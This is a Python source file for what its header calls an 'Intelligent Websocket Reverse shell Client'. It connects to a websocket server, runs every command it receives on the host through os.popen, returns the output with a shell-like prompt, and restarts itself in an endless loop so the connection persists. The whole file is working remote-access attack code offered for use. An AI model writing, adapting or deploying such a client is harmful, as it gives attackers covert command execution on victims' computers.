"""
    | - Intelligent Websocket Reverse shell Client - |
            | -  Made by NiGhTFuRy, Vexius - |
                | ~ Refactored by VEX ~ |
"""


import os
import asyncio
import websockets
from threading import Thread
import time


class Client:
    """Client class that manages overall behavior"""
    def __init__(self, uri):
        self._uri = uri
        
        self._cc = {
            'OKBLUE' : '\033[94m',
            'FAIL' : '\033[91m',
            'ENDC' : '\033[0m',
        }

    def _pwd(self):
        """Returns the current path"""
        return (self._cc["OKBLUE"] + "("+ self._cc["FAIL"] +f"{os.getlogin()}💀windows"+ 
                self._cc["ENDC"] + self._cc["OKBLUE"] + ")-[" + self._cc["ENDC"] + 
                f"{os.getcwd()}" + self._cc["OKBLUE"] + "]>" + self._cc["ENDC"])

    async def _connect(self, bug=False):
        """Manages the connection (websocket)"""
        async with websockets.connect(self._uri) as ws:
            await ws.send(self._pwd())
            if bug:
                await ws.send("No such commad or there was an Error")
                await ws.send(self._pwd())
            while True:
                try:
                    await self._handler(ws)
                except websockets.exceptions.ConnectionClosedError:
                    await self._connect(bug=True)
                except websockets.ConnectionClosedOK:
                    break

    async def _handler(self, ws):
        """Checks all incoming commands"""
        event_loop = asyncio.get_running_loop()
        cmd = await ws.recv()
        cmd = cmd.strip().split()

        if cmd and cmd[0] not in ["cmd","powershell"]:
            if cmd[0] == "cd" or ":" in cmd[0]:
                await event_loop.create_task(self._check_cd(cmd , ws))
                await ws.send(self._pwd())
            else:
                await event_loop.create_task(self._check_others_cmd(cmd,ws))
                await ws.send(self._pwd())
        elif cmd and cmd[0] in ["cmd","powershell"]:
            await ws.send("you can't spawn a new shell (cmd or powershell)")
            await ws.send(self._pwd())
        else:
            await ws.send(self._pwd())

    async def _check_cd(self, cmd, ws):
        """Manages change directory commads"""
        try:
            if len(cmd) > 1:
                if cmd[1] != "..":
                    os.chdir(cmd[1])
                else:
                    os.chdir(cmd[1] + "\\")
            elif ":" in cmd[0]:
                os.chdir(cmd[0])
        except Exception as e:
            await ws.send(str(e))

    async def _check_others_cmd(self, cmd, ws):
        """Manages other commads"""
        try:
            r = os.popen(" ".join(cmd)).read()
            await ws.send(r)
        except Exception as e:
            await ws.send(str(e))

    def run(self):
        """Runs the client"""
        asyncio.run(self._connect())

def start():
    address = "ws://127.0.0.1:8765"
    client = Client(address)
    client.run()
    
if __name__ == "__main__":
    while True:
        try:
            print("Creating new worker...")
            p = Thread(target=start)
            p.start()
            p.join()
            print("Worker terminated\n")
        except:
            time.sleep(2)
            pass
    